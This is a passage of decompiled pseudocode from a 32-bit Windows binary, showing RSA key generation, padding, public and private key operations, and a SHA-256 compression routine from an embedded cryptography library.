    return 0;
  }
  else
  {
    return -16896;
  }
}

//----- (00406450) --------------------------------------------------------
int __cdecl sub_406450(int *a1, int a2, int a3, int a4, int a5, int a6)
{
  int result; // eax

  if ( (!sub_4030C0(a1 + 2, 0)
     || !sub_4030C0(a1 + 11, 0)
     || !sub_4030C0(a1 + 14, 0)
     || !sub_4030C0(a1 + 8, 0)
     || !sub_4030C0(a1 + 5, 0))
    && (a3 || a4 || a5) )
  {
    return -16512;
  }
  if ( (!a2 || (result = sub_4031E0(a2, (int)(a1 + 2))) == 0)
    && (!a3 || (result = sub_4031E0(a3, (int)(a1 + 11))) == 0)
    && (!a4 || (result = sub_4031E0(a4, (int)(a1 + 14))) == 0)
    && (!a5 || (result = sub_4031E0(a5, (int)(a1 + 8))) == 0) )
  {
    if ( !a6 )
      return 0;
    result = sub_4031E0(a6, (int)(a1 + 5));
    if ( !result )
      return 0;
  }
  return result;
}

//----- (00406550) --------------------------------------------------------
int __cdecl sub_406550(int *a1, int a2, int a3, int a4)
{
  int v4; // eax

  if ( !sub_4030C0(a1 + 2, 0)
    || !sub_4030C0(a1 + 11, 0)
    || !sub_4030C0(a1 + 14, 0)
    || !sub_4030C0(a1 + 8, 0)
    || !sub_4030C0(a1 + 5, 0) )
  {
    return -16512;
  }
  if ( a2 )
  {
    v4 = sub_4031E0(a2, (int)(a1 + 17));
    if ( v4 )
      return v4 - 16512;
  }
  if ( a3 )
  {
    v4 = sub_4031E0(a3, (int)(a1 + 20));
    if ( v4 )
      return v4 - 16512;
  }
  if ( a4 )
  {
    v4 = sub_4031E0(a4, (int)(a1 + 23));
    if ( v4 )
      return v4 - 16512;
  }
  return 0;
}

//----- (00406620) --------------------------------------------------------
void __cdecl sub_406620(int a1)
{
  if ( a1 )
  {
    sub_404050(a1 + 140);
    sub_404050(a1 + 152);
    sub_404050(a1 + 104);
    sub_404050(a1 + 32);
    sub_404050(a1 + 56);
    sub_404050(a1 + 44);
    sub_404050(a1 + 20);
    sub_404050(a1 + 8);
    sub_404050(a1 + 128);
    sub_404050(a1 + 116);
    sub_404050(a1 + 92);
    sub_404050(a1 + 80);
    sub_404050(a1 + 68);
  }
}

//----- (004066C0) --------------------------------------------------------
int __cdecl sub_4066C0(int *a1, void (__cdecl *a2)(int, unsigned int, unsigned int), int a3, unsigned int a4, int a5)
{
  int v5; // ebx
  int v6; // esi
  int *v7; // edi
  __int64 *v8; // ebx
  unsigned int v9; // eax
  unsigned int v10; // ecx
  int v12; // eax
  int v13[3]; // [esp+4h] [ebp-30h] BYREF
  int v14[3]; // [esp+10h] [ebp-24h] BYREF
  int v15[3]; // [esp+1Ch] [ebp-18h] BYREF
  int *v16; // [esp+28h] [ebp-Ch]
  unsigned int v17; // [esp+2Ch] [ebp-8h]
  int v18; // [esp+30h] [ebp-4h]

  if ( a4 < 0x80 || a5 < 3 || (a4 & 1) != 0 )
    return -16512;
  v18 = a4 > 0x400 ? 2 : 0;
  sub_404760(v15);
  sub_404760(v14);
  sub_404760(v13);
  v5 = (int)a1;
  v16 = a1 + 5;
  v6 = sub_404E70((int)(a1 + 5), a5);
  if ( !v6 )
  {
    v7 = a1 + 11;
    v17 = a4 >> 1;
    v6 = sub_404310((int)(a1 + 11), a4 >> 1, v18, a2, a3);
    if ( !v6 )
    {
      v8 = (__int64 *)(a1 + 14);
      while ( 1 )
      {
        v6 = sub_404310((int)v8, v17, v18, a2, a3);
        if ( v6 )
          goto LABEL_24;
        v6 = sub_4057D0(v15, v7, v8);
        if ( v6 )
          goto LABEL_24;
        v9 = sub_402FC0((int)v15);
        v10 = v17 - 99;
        if ( a4 < 0xC8 )
          v10 = 0;
        if ( v9 > v10 )
        {
          if ( v15[0] < 0 )
            sub_405840((__int64 *)v7, v8);
          v6 = sub_405790(v7, v7, 1);
          if ( v6 )
            goto LABEL_24;
          v6 = sub_405790(v8, (int *)v8, 1);
          if ( v6 )
            goto LABEL_24;
          v6 = sub_405190(v15, v7, (int *)v8);
          if ( v6 )
            goto LABEL_24;
          v6 = sub_4040A0((int)v14, (int)v16, (int)v15);
          if ( v6 )
            goto LABEL_24;
          if ( !sub_4030C0(v14, 1) )
          {
            v6 = sub_4040A0((int)v14, (int)v7, (int)v8);
            if ( v6 )
              goto LABEL_24;
            v6 = sub_4032C0(v13, 0, v15, v14);
            if ( v6 )
              goto LABEL_24;
            v6 = sub_404780((int)(a1 + 8), v16, v13);
            if ( v6 )
              goto LABEL_24;
            if ( sub_402FC0((int)(a1 + 8)) > (a4 + 1) >> 1 )
              break;
          }
        }
        v6 = sub_404310((int)v7, v17, v18, a2, a3);
        if ( v6 )
          goto LABEL_24;
      }
      v6 = sub_402F10(v7, v7, 1);
      if ( v6 || (v6 = sub_402F10(v8, (int *)v8, 1)) != 0 || (v6 = sub_405190(a1 + 2, v7, (int *)v8)) != 0 )
      {
LABEL_24:
        v5 = (int)a1;
        goto LABEL_25;
      }
      a1[1] = sub_4056A0((int)(a1 + 2));
      v12 = sub_408040(v7, (int *)v8, a1 + 8, a1 + 17, a1 + 20, (int)(a1 + 23));
      v5 = (int)a1;
      v6 = v12;
      if ( !v12 )
        v6 = sub_406330(a1);
    }
  }
LABEL_25:
  sub_404050((int)v15);
  sub_404050((int)v14);
  sub_404050((int)v13);
  if ( !v6 )
    return 0;
  sub_406620(v5);
  return v6 - 16768;
}
// 4066C0: using guessed type int var_24[3];
// 4066C0: using guessed type int var_30[3];

//----- (004069A0) --------------------------------------------------------
int __cdecl sub_4069A0(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // eax

  if ( a2 )
  {
    v6 = sub_4031E0(a1 + 8, a2);
    if ( v6 )
      return v6 - 16512;
  }
  if ( a3 )
  {
    v6 = sub_4031E0(a1 + 44, a3);
    if ( v6 )
      return v6 - 16512;
  }
  if ( a4 )
  {
    v6 = sub_4031E0(a1 + 56, a4);
    if ( v6 )
      return v6 - 16512;
  }
  if ( a5 )
  {
    v6 = sub_4031E0(a1 + 32, a5);
    if ( v6 )
      return v6 - 16512;
  }
  if ( a6 )
  {
    v6 = sub_4031E0(a1 + 20, a6);
    if ( v6 )
      return v6 - 16512;
  }
  if ( a2 )
    *(_DWORD *)(a1 + 4) = sub_4056A0(a1 + 8);
  return 0;
}

//----- (00406A50) --------------------------------------------------------
int __cdecl sub_406A50(void *a1, int a2, int a3)
{
  int result; // eax

  memset(a1, 0, 0xA4u);
  *((_DWORD *)a1 + 41) = a2;
  result = a3;
  *((_DWORD *)a1 + 42) = a3;
  return result;
}

//----- (00406A80) --------------------------------------------------------
int __cdecl sub_406A80(
        int *a1,
        void (__cdecl *a2)(int, unsigned int, unsigned int),
        int a3,
        int a4,
        size_t Size,
        void *Src,
        char *a7)
{
  int *v7; // edi
  unsigned int v9; // ebx
  void (__cdecl *v10)(int, unsigned int, unsigned int); // ecx
  size_t v11; // ebx
  char *v12; // esi
  int v13; // edi
  int v14; // eax

  v7 = a1;
  if ( a1[41] )
    return -16640;
  if ( Size + 11 < Size )
    return -16512;
  v9 = a1[1];
  if ( v9 < Size + 11 )
    return -16512;
  v10 = a2;
  v11 = v9 - Size - 3;
  *a7 = 0;
  v12 = a7 + 1;
  if ( !a4 )
  {
    if ( a2 )
    {
      *v12 = 2;
      v12 = a7 + 2;
      if ( v11 )
      {
        while ( 2 )
        {
          --v11;
          v13 = 100;
          do
          {
            v14 = ((int (__cdecl *)(int, char *, int))v10)(a3, v12, 1);
            if ( *v12 )
              break;
            if ( !--v13 )
              return v14 - 17536;
            v10 = a2;
          }
          while ( !v14 );
          if ( v14 )
            return v14 - 17536;
          v10 = a2;
          ++v12;
          if ( v11 )
            continue;
          break;
        }
        v7 = a1;
      }
      goto LABEL_15;
    }
    return -16512;
  }
LABEL_15:
  *v12 = 0;
  memcpy(v12 + 1, Src, Size);
  if ( a4 )
    return sub_406B70(v7, a2, a3, a7, a7);
  else
    return sub_4070A0((int)v7, a7, a7);
}
// 406AFE: conditional instruction was optimized away because edi.4!=0

//----- (00406B70) --------------------------------------------------------
int __cdecl sub_406B70(int *a1, void (__cdecl *a2)(int, unsigned int, unsigned int), int a3, void *Src, char *a5)
{
  int v7; // esi
  int *v8; // ebx
  int v9; // eax
  void (__cdecl *v10)(int, unsigned int, unsigned int); // edx
  int v11; // eax
  int v12; // ecx
  int v13[3]; // [esp+8h] [ebp-7Ch] BYREF
  int v14[3]; // [esp+14h] [ebp-70h] BYREF
  int v15[3]; // [esp+20h] [ebp-64h] BYREF
  int v16[3]; // [esp+2Ch] [ebp-58h] BYREF
  int v17[3]; // [esp+38h] [ebp-4Ch] BYREF
  int v18[3]; // [esp+44h] [ebp-40h] BYREF
  int v19[3]; // [esp+50h] [ebp-34h] BYREF
  int v20[3]; // [esp+5Ch] [ebp-28h] BYREF
  int v21[3]; // [esp+68h] [ebp-1Ch] BYREF
  int v22[3]; // [esp+74h] [ebp-10h] BYREF
  int *v23; // [esp+80h] [ebp-4h]
  int *v24; // [esp+8Ch] [ebp+8h]
  int v25; // [esp+8Ch] [ebp+8h]

  v24 = a1 + 17;
  v23 = a1 + 20;
  if ( sub_4071B0(a1, 1) )
    return -16512;
  sub_404760(v22);
  sub_404760(v16);
  sub_404760(v15);
  sub_404760(v20);
  if ( a2 )
  {
    sub_404760(v19);
    sub_404760(v18);
  }
  sub_404760(v21);
  sub_404760(v17);
  sub_404760(v13);
  sub_404760(v14);
  v7 = sub_405360((int)v22, Src, a1[1]);
  if ( !v7 )
  {
    v8 = a1 + 2;
    if ( sub_403100(v22, a1 + 2) >= 0 )
    {
      v7 = -4;
      goto LABEL_49;
    }
    v9 = sub_4031E0((int)v13, (int)v22);
    v7 = v9;
    if ( v9 )
      goto LABEL_49;
    v10 = a2;
    if ( !a2 )
    {
LABEL_35:
      v7 = sub_403860(v21, v22, (int)v24, (int)(a1 + 11), (int)(a1 + 29));
      if ( !v7 )
      {
        v7 = sub_403860(v17, v22, (int)v23, (int)(a1 + 14), (int)(a1 + 32));
        if ( !v7 )
        {
          v7 = sub_4057D0(v22, v21, v17);
          if ( !v7 )
          {
            v7 = sub_405190(v21, v22, a1 + 23);
            if ( !v7 )
            {
              v7 = sub_404FB0(v22, v21, a1 + 11);
              if ( !v7 )
              {
                v7 = sub_405190(v21, v22, a1 + 14);
                if ( !v7 )
                {
                  v7 = sub_402F50(v22, v17, v21);
                  if ( !v7 && (!a2 || (v7 = sub_405190(v22, v22, a1 + 38)) == 0 && (v7 = sub_404FB0(v22, v22, v8)) == 0) )
                  {
                    v7 = sub_403860(v14, v22, (int)(a1 + 5), (int)v8, (int)(a1 + 26));
                    if ( !v7 )
                    {
                      if ( sub_403100(v14, v13) )
                        v7 = -17280;
                      else
                        v7 = sub_405870((int)v22, a5, a1[1]);
                    }
                  }
                }
              }
            }
          }
        }
      }
      goto LABEL_49;
    }
    if ( !a1[40] )
    {
      v12 = (int)(a1 + 38);
      while ( 1 )
      {
        v25 = v9 + 1;
        v7 = sub_403F50(v12, a1[1] - 1, v10, a3);
        if ( v7 )
          goto LABEL_49;
        v7 = sub_4040A0((int)(a1 + 35), (int)(a1 + 38), (int)(a1 + 2));
        if ( v7 )
          goto LABEL_49;
        if ( !sub_4030C0(a1 + 35, 1) )
        {
          v7 = sub_404780((int)(a1 + 35), a1 + 38, a1 + 2);
          if ( v7 )
            goto LABEL_49;
          v11 = sub_403860(a1 + 35, a1 + 35, (int)(a1 + 5), (int)(a1 + 2), (int)(a1 + 26));
          goto LABEL_23;
        }
        v9 = v25;
        v12 = (int)(a1 + 38);
        v10 = a2;
        if ( v25 > 10 )
        {
          v7 = -17536;
          goto LABEL_49;
        }
      }
    }
    v7 = sub_405190(a1 + 35, a1 + 35, a1 + 35);
    if ( !v7 )
    {
      v7 = sub_404FB0(a1 + 35, a1 + 35, a1 + 2);
      if ( !v7 )
      {
        v7 = sub_405190(a1 + 38, a1 + 38, a1 + 38);
        if ( !v7 )
        {
          v11 = sub_404FB0(a1 + 38, a1 + 38, a1 + 2);
LABEL_23:
          v7 = v11;
          if ( !v11 )
          {
            v7 = sub_405190(v22, v22, a1 + 35);
            if ( !v7 )
            {
              v8 = a1 + 2;
              v7 = sub_404FB0(v22, v22, a1 + 2);
              if ( !v7 )
              {
                v7 = sub_405790(v16, a1 + 11, 1);
                if ( !v7 )
                {
                  v7 = sub_405790(v15, a1 + 14, 1);
                  if ( !v7 )
                  {
                    v7 = sub_403F50((int)v20, 0x1Cu, a2, a3);
                    if ( !v7 )
                    {
                      v7 = sub_405190(v19, v16, v20);
                      if ( !v7 )
                      {
                        v7 = sub_402F50(v19, v19, a1 + 17);
                        if ( !v7 )
                        {
                          v24 = v19;
                          v7 = sub_403F50((int)v20, 0x1Cu, a2, a3);
                          if ( !v7 )
                          {
                            v7 = sub_405190(v18, v15, v20);
                            if ( !v7 )
                            {
                              v7 = sub_402F50(v18, v18, a1 + 20);
                              if ( !v7 )
                              {
                                v23 = v18;
                                goto LABEL_35;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LABEL_49:
  sub_404050((int)v16);
  sub_404050((int)v15);
  sub_404050((int)v20);
  if ( a2 )
  {
    sub_404050((int)v19);
    sub_404050((int)v18);
  }
  sub_404050((int)v22);
  sub_404050((int)v21);
  sub_404050((int)v17);
  sub_404050((int)v14);
  sub_404050((int)v13);
  if ( v7 )
    return v7 - 17152;
  else
    return 0;
}
// 406B70: using guessed type int var_58[3];
// 406B70: using guessed type int var_64[3];
// 406B70: using guessed type int var_28[3];
// 406B70: using guessed type int var_34[3];
// 406B70: using guessed type int var_40[3];
// 406B70: using guessed type int var_1C[3];
// 406B70: using guessed type int var_4C[3];
// 406B70: using guessed type int var_7C[3];
// 406B70: using guessed type int var_70[3];

//----- (004070A0) --------------------------------------------------------
int __cdecl sub_4070A0(int a1, void *Src, char *a3)
{
  unsigned int v4; // esi
  int *v5; // edi
  int v6; // esi
  int v8[3]; // [esp+Ch] [ebp-Ch] BYREF
  int v9; // [esp+20h] [ebp+8h]

  v4 = *(_DWORD *)(a1 + 4);
  v5 = (int *)(a1 + 8);
  if ( v4 != sub_4056A0(a1 + 8)
    || v4 > 0x400
    || sub_4030C0(v5, 0) <= 0
    || !sub_4046C0((int)v5, 0)
    || sub_4030C0((int *)(a1 + 20), 0) <= 0 )
  {
    return -16512;
  }
  sub_404760(v8);
  v6 = sub_405360((int)v8, Src, *(_DWORD *)(a1 + 4));
  if ( !v6 )
  {
    if ( sub_403100(v8, v5) < 0 )
    {
      v9 = *(_DWORD *)(a1 + 4);
      v6 = sub_403860(v8, v8, a1 + 20, (int)v5, a1 + 104);
      if ( !v6 )
        v6 = sub_405870((int)v8, a3, v9);
    }
    else
    {
      v6 = -4;
    }
  }
  sub_404050((int)v8);
  if ( v6 )
    return v6 - 17024;
  else
    return 0;
}

//----- (004071B0) --------------------------------------------------------
int __cdecl sub_4071B0(int *a1, int a2)
{
  unsigned int v2; // ebx
  int *v3; // edi

  v2 = a1[1];
  v3 = a1 + 2;
  if ( v2 == sub_4056A0((int)(a1 + 2))
    && v2 <= 0x400
    && sub_4030C0(v3, 0) > 0
    && sub_4046C0((int)v3, 0)
    && (!a2
     || sub_4030C0(a1 + 11, 0) > 0
     && sub_4046C0((int)(a1 + 11), 0)
     && sub_4030C0(a1 + 14, 0) > 0
     && sub_4046C0((int)(a1 + 14), 0))
    && sub_4030C0(a1 + 5, 0) > 0
    && (!a2 || sub_4030C0(a1 + 17, 0) > 0 && sub_4030C0(a1 + 20, 0) > 0 && sub_4030C0(a1 + 23, 0) > 0) )
  {
    return 0;
  }
  else
  {
    return -16512;
  }
}

//----- (004072B0) --------------------------------------------------------
int __cdecl sub_4072B0(_DWORD *a1, int a2)
{
  int v2; // edx
  int v3; // esi
  int v4; // eax
  unsigned int v5; // ebx
  int v6; // edi
  int v7; // eax
  int v8; // ecx
  int v9; // ebx
  unsigned int v10; // eax
  int v11; // edi
  int v12; // ebx
  int v13; // edi
  int v14; // edi
  int v15; // edi
  int v16; // esi
  unsigned int v17; // esi
  char *v18; // esi
  int v19; // esi
  int v20; // esi
  int v21; // edx
  unsigned int v22; // ecx
  unsigned int v23; // ebx
  char *v24; // edi
  unsigned int v25; // esi
  int v26; // ecx
  int v27; // edx
  int v28; // esi
  int v29; // ecx
  unsigned int v30; // edi
  int v31; // esi
  int v32; // ecx
  unsigned int v33; // ebx
  int v34; // edx
  int v35; // esi
  unsigned int v36; // esi
  int v37; // ecx
  int v38; // edi
  int v39; // edx
  unsigned int v40; // edi
  int v41; // edx
  int v42; // ebx
  int v43; // ecx
  int v44; // edx
  int v45; // ecx
  int v46; // esi
  int v47; // edx
  unsigned int v48; // ebx
  int v49; // edx
  int v50; // esi
  int v51; // ecx
  int v52; // edi
  int v53; // esi
  unsigned int v54; // edi
  int v55; // ecx
  int v56; // ebx
  int v57; // esi
  unsigned int v58; // ebx
  unsigned int v59; // edx
  int v60; // edi
  int v61; // ecx
  int v62; // esi
  int v63; // esi
  int v64; // edi
  int v65; // esi
  int v66; // edx
  int v67; // ecx
  int v68; // esi
  int v69; // esi
  int v70; // ebx
  int v71; // edi
  int v72; // edx
  int v73; // eax
  int v75[79]; // [esp+0h] [ebp-174h] BYREF
  int v76; // [esp+13Ch] [ebp-38h]
  unsigned int v77; // [esp+140h] [ebp-34h]
  unsigned int v78; // [esp+144h] [ebp-30h]
  unsigned int v79; // [esp+148h] [ebp-2Ch]
  char *v80; // [esp+14Ch] [ebp-28h]
  int v81; // [esp+150h] [ebp-24h]
  int v82; // [esp+154h] [ebp-20h]
  int v83; // [esp+158h] [ebp-1Ch]
  int v84; // [esp+15Ch] [ebp-18h]
  int v85; // [esp+160h] [ebp-14h]
  int v86; // [esp+164h] [ebp-10h]
  int v87; // [esp+168h] [ebp-Ch]
  int v88; // [esp+16Ch] [ebp-8h]
  unsigned int v89; // [esp+170h] [ebp-4h]

  v2 = a1[6];
  v3 = a1[7];
  v76 = a1[2];
  v81 = a1[3];
  v85 = a1[4];
  v86 = a1[5];
  v4 = a1[8];
  v83 = v76;
  v5 = 0;
  v88 = v4;
  v6 = a2 + 2;
  v7 = a1[9];
  v82 = v2;
  v87 = v3;
  v84 = v7;
  do
  {
    v8 = *(unsigned __int8 *)(v6 - 2);
    v6 += 4;
    v75[v5++ + 15] = *(unsigned __int8 *)(v6 - 3) | ((*(unsigned __int8 *)(v6 - 4) | ((*(unsigned __int8 *)(v6 - 5) | (v8 << 8)) << 8)) << 8);
  }
  while ( v5 < 0x10 );
  v9 = v83;
  v10 = 0;
  while ( 1 )
  {
    v11 = v84
        + v75[v10 + 15]
        + dword_417810[v10]
        + (v88 ^ v2 & (v88 ^ v3))
        + (__ROR4__(v2, 6) ^ __ROL4__(v2, 7) ^ __ROR4__(v2, 11));
    v84 = v11 + v86;
    v12 = v11 + (__ROR4__(v9, 2) ^ __ROL4__(v9, 10) ^ __ROR4__(v9, 13)) + (v85 & (v9 | v81) | v81 & v9);
    v13 = v88
        + v75[v10 + 16]
        + dword_417814[v10]
        + (v87 ^ (v11 + v86) & (v82 ^ v87))
        + (__ROR4__(v11 + v86, 6) ^ __ROL4__(v11 + v86, 7) ^ __ROR4__(v11 + v86, 11));
    v89 = v13 + v85;
    v88 = v13 + (__ROR4__(v12, 2) ^ __ROL4__(v12, 10) ^ __ROR4__(v12, 13)) + (v81 & (v12 | v83) | v12 & v83);
    v14 = v87
        + v75[v10 + 17]
        + dword_417818[v10]
        + (v82 ^ (v13 + v85) & (v82 ^ v84))
        + (__ROR4__(v13 + v85, 6) ^ __ROL4__(v13 + v85, 7) ^ __ROR4__(v13 + v85, 11));
    v80 = (char *)(v14 + v81);
    v87 = v14 + (__ROR4__(v88, 2) ^ __ROL4__(v88, 10) ^ __ROR4__(v88, 13)) + (v83 & (v12 | v88) | v12 & v88);
    v15 = v82
        + v75[v10 + 18]
        + dword_41781C[v10]
        + (v84 ^ (v14 + v81) & (v89 ^ v84))
        + (__ROR4__(v14 + v81, 6) ^ __ROL4__(v14 + v81, 7) ^ __ROR4__(v14 + v81, 11));
    v83 += v15;
    v82 = v15 + (__ROR4__(v87, 2) ^ __ROL4__(v87, 10) ^ __ROR4__(v87, 13)) + (v12 & (v88 | v87) | v88 & v87);
    v16 = v84
        + v75[v10 + 19]
        + dword_417820[v10]
        + (v89 ^ v83 & (v89 ^ (unsigned int)v80))
        + (__ROR4__(v83, 6) ^ __ROL4__(v83, 7) ^ __ROR4__(v83, 11));
    v84 = v12 + v16;
    v86 = v16 + (__ROR4__(v82, 2) ^ __ROL4__(v82, 10) ^ __ROR4__(v82, 13)) + (v87 & v82 | v88 & (v87 | v82));
    v17 = v89
        + v75[v10 + 20]
        + dword_417824[v10]
        + ((unsigned int)v80 ^ v84 & (v83 ^ (unsigned int)v80))
        + (__ROR4__(v84, 6) ^ __ROL4__(v12 + v16, 7) ^ __ROR4__(v12 + v16, 11));
    v88 += v17;
    v85 = v87 & (v82 | v86);
    v85 |= v82 & v86;
    v85 += v17 + (__ROR4__(v86, 2) ^ __ROL4__(v86, 10) ^ __ROR4__(v86, 13));
    v18 = &v80[v75[v10 + 21]
             + dword_417828[v10]
             + (v83 ^ v88 & (v84 ^ v83))
             + (__ROR4__(v88, 6) ^ __ROL4__(v88, 7) ^ __ROR4__(v88, 11))];
    v87 += (int)v18;
    v81 = v82 & (v86 | v85);
    v81 |= v86 & v85;
    v81 += (int)&v18[__ROR4__(v85, 2) ^ __ROL4__(v85, 10) ^ __ROR4__(v85, 13)];
    v19 = v75[v10 + 22]
        + dword_41782C[v10]
        + (v84 ^ v87 & (v88 ^ v84))
        + (__ROR4__(v87, 6) ^ __ROL4__(v87, 7) ^ __ROR4__(v87, 11));
    v10 += 8;
    v20 = v83 + v19;
    v82 += v20;
    v21 = v20 + (__ROR4__(v81, 2) ^ __ROL4__(v81, 10) ^ __ROR4__(v81, 13));
    v3 = v87;
    v9 = v21 + (v81 & v85 | v86 & (v81 | v85));
    v83 = v9;
    if ( v10 >= 16 )
      break;
    v2 = v82;
  }
  v22 = 64;
  v89 = 64;
  do
  {
    v23 = *(int *)((char *)v75 + v22);
    v24 = (char *)&v75[13] + v22;
    v25 = *(int *)((char *)&v75[13] + v22);
    v80 = v24;
    v26 = ((v23 >> 3) ^ __ROR4__(v23, 7) ^ __ROL4__(v23, 14)) + ((v25 >> 10) ^ __ROL4__(v25, 13) ^ __ROL4__(v25, 15));
    v27 = v82;
    v28 = v82;
    v29 = *((_DWORD *)v24 - 5) + *((_DWORD *)v24 - 14) + v26;
    *(int *)((char *)&v75[15] + v89) = v29;
    v77 = v29;
    v30 = *((_DWORD *)v24 - 12);
    v31 = v84
        + v29
        + *(int *)((char *)dword_417810 + v89)
        + (v88 ^ v27 & (v88 ^ v87))
        + (__ROR4__(v27, 6) ^ __ROL4__(v28, 7) ^ __ROR4__(v28, 11));
    v86 += v31;
    v84 = v31 + (__ROR4__(v83, 2) ^ __ROL4__(v83, 10) ^ __ROR4__(v83, 13)) + (v85 & (v83 | v81) | v83 & v81);
    v32 = v84;
    v33 = *((_DWORD *)v80 - 4)
        + ((v30 >> 3) ^ __ROR4__(v30, 7) ^ __ROL4__(v30, 14))
        + ((*((_DWORD *)v80 + 1) >> 10) ^ __ROL4__(*((_DWORD *)v80 + 1), 13) ^ __ROL4__(*((_DWORD *)v80 + 1), 15))
        + v23;
    v34 = v86;
    *(int *)((char *)&v75[16] + v89) = v33;
    v35 = v88
        + v33
        + *(int *)((char *)dword_417814 + v89)
        + (v87 ^ v34 & (v82 ^ v87))
        + (__ROR4__(v34, 6) ^ __ROL4__(v34, 7) ^ __ROR4__(v34, 11));
    v85 += v35;
    v88 = v35 + (__ROR4__(v32, 2) ^ __ROL4__(v32, 10) ^ __ROR4__(v32, 13)) + (v81 & (v83 | v32) | v83 & v84);
    v36 = *(int *)((char *)&v75[2] + v89);
    v37 = v30
        + *(int *)((char *)&v75[10] + v89)
        + ((v77 >> 10) ^ __ROL4__(v77, 13) ^ __ROL4__(v77, 15))
        + ((v36 >> 3) ^ __ROR4__(v36, 7) ^ __ROL4__(v36, 14));
    v38 = v85;
    *(int *)((char *)&v75[17] + v89) = v37;
    v79 = v37;
    v39 = v87
        + v37
        + *(int *)((char *)dword_417818 + v89)
        + (v82 ^ v38 & (v82 ^ v86))
        + (__ROR4__(v38, 6) ^ __ROL4__(v38, 7) ^ __ROR4__(v38, 11));
    v81 += v39;
    v87 = v39 + (__ROR4__(v88, 2) ^ __ROL4__(v88, 10) ^ __ROR4__(v88, 13)) + (v84 & v88 | v83 & (v84 | v88));
    v40 = *(int *)((char *)&v75[3] + v89);
    v41 = (v33 >> 10) ^ __ROL4__(v33, 13) ^ __ROL4__(v33, 15);
    v42 = v81;
    v43 = v41 + ((v40 >> 3) ^ __ROR4__(v40, 7) ^ __ROL4__(v40, 14));
    v44 = __ROR4__(v81, 11);
    v45 = v36 + *(int *)((char *)&v75[11] + v89) + v43;
    v46 = v87;
    *(int *)((char *)&v75[18] + v89) = v45;
    v78 = v45;
    v47 = v82
        + v45
        + *(int *)((char *)dword_41781C + v89)
        + (v86 ^ v42 & (v86 ^ v85))
        + (__ROR4__(v42, 6) ^ __ROL4__(v42, 7) ^ v44);
    v83 += v47;
    v82 = v47 + (__ROR4__(v46, 2) ^ __ROL4__(v46, 10) ^ __ROR4__(v46, 13)) + (v88 & v46 | v84 & (v88 | v46));
    v48 = *(int *)((char *)&v75[4] + v89);
    v49 = v83;
    v50 = __ROR4__(v83, 11);
    v51 = v40
        + *(int *)((char *)&v75[12] + v89)
        + ((v48 >> 3) ^ __ROR4__(v48, 7) ^ __ROL4__(v48, 14))
        + ((v79 >> 10) ^ __ROL4__(v79, 13) ^ __ROL4__(v79, 15));
    v52 = v82;
    *(int *)((char *)&v75[19] + v89) = v51;
    v79 = v51;
    v53 = v86
        + v51
        + *(int *)((char *)dword_417820 + v89)
        + (v85 ^ v49 & (v81 ^ v85))
        + (__ROR4__(v49, 6) ^ __ROL4__(v49, 7) ^ v50);
    v84 += v53;
    v86 = v53 + (__ROR4__(v52, 2) ^ __ROL4__(v52, 10) ^ __ROR4__(v52, 13)) + (v88 & (v52 | v87) | v52 & v87);
    v54 = *(int *)((char *)&v75[5] + v89);
    v55 = v48
        + *(int *)((char *)&v75[13] + v89)
        + ((v54 >> 3) ^ __ROR4__(v54, 7) ^ __ROL4__(v54, 14))
        + ((v78 >> 10) ^ __ROL4__(v78, 13) ^ __ROL4__(v78, 15));
    v56 = v84;
    *(int *)((char *)&v75[20] + v89) = v55;
    v78 = v55;
    v57 = v85
        + v55
        + *(int *)((char *)dword_417824 + v89)
        + (v81 ^ v56 & (v83 ^ v81))
        + (__ROR4__(v56, 6) ^ __ROL4__(v56, 7) ^ __ROR4__(v56, 11));
    v88 += v57;
    v85 = v57 + (__ROR4__(v86, 2) ^ __ROL4__(v86, 10) ^ __ROR4__(v86, 13)) + (v87 & (v82 | v86) | v82 & v86);
    v58 = *((_DWORD *)v80 - 7);
    v59 = v54 + ((v79 >> 10) ^ __ROL4__(v79, 13) ^ __ROL4__(v79, 15));
    v60 = v88;
    v61 = *((_DWORD *)v80 + 1) + v59 + ((v58 >> 3) ^ __ROR4__(v58, 7) ^ __ROL4__(v58, 14));
    v62 = __ROR4__(v88, 11);
    *(int *)((char *)&v75[21] + v89) = v61;
    v63 = (v83 ^ v60 & (v84 ^ v83)) + (__ROR4__(v60, 6) ^ __ROL4__(v60, 7) ^ v62);
    v64 = v82;
    v65 = v81 + v61 + *(int *)((char *)dword_417828 + v89) + v63;
    v87 += v65;
    v81 = v65 + (__ROR4__(v85, 2) ^ __ROL4__(v85, 10) ^ __ROR4__(v85, 13)) + (v82 & (v86 | v85) | v86 & v85);
    v66 = v87;
    v67 = v58
        + v77
        + ((v78 >> 10) ^ __ROL4__(v78, 13) ^ __ROL4__(v78, 15))
        + ((*((_DWORD *)v80 - 6) >> 3) ^ __ROR4__(*((_DWORD *)v80 - 6), 7) ^ __ROL4__(*((_DWORD *)v80 - 6), 14));
    v68 = __ROR4__(v87, 11);
    *(int *)((char *)&v75[22] + v89) = v67;
    v69 = v83
        + v67
        + *(int *)((char *)dword_41782C + v89)
        + (v84 ^ v66 & (v88 ^ v84))
        + (__ROR4__(v66, 6) ^ __ROL4__(v66, 7) ^ v68);
    v70 = v64 + v69;
    v71 = v81;
    v82 = v70;
    v72 = v69 + (__ROR4__(v81, 2) ^ __ROL4__(v81, 10) ^ __ROR4__(v81, 13));
    v22 = v89 + 32;
    v83 = v72 + (v86 & (v81 | v85) | v81 & v85);
    v89 = v22;
  }
  while ( v22 < 0x100 );
  a1[2] = v76 + v72 + (v86 & (v81 | v85) | v81 & v85);
  a1[4] += v85;
  a1[5] += v86;
  a1[7] += v87;
  a1[3] += v71;
  a1[8] += v88;
  v73 = v84;
  a1[6] += v70;
  a1[9] += v73;
  return 0;
}
// 417810: using guessed type int dword_417810[];
// 417814: using guessed type int dword_417814[];
// 417818: using guessed type int dword_417818[];
// 41781C: using guessed type int dword_41781C[];
// 417820: using guessed type int dword_417820[];
// 417824: using guessed type int dword_417824[];
// 417828: using guessed type int dword_417828[];
// 41782C: using guessed type int dword_41782C[];

//----- (00407C00) --------------------------------------------------------
int __cdecl sub_407C00(int a1, _BYTE *a2)
{
  int v2; // ecx
  char *v3; // edi
  unsigned int v4; // ecx
  int result; // eax
  int v6; // edx
  int v7; // ecx

  v2 = *(_DWORD *)a1 & 0x3F;
  v3 = (char *)(a1 + 40);
  *(_BYTE *)(v2 + a1 + 40) = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x38 )
  {
    memset(&v3[v4], 0, 64 - v4);
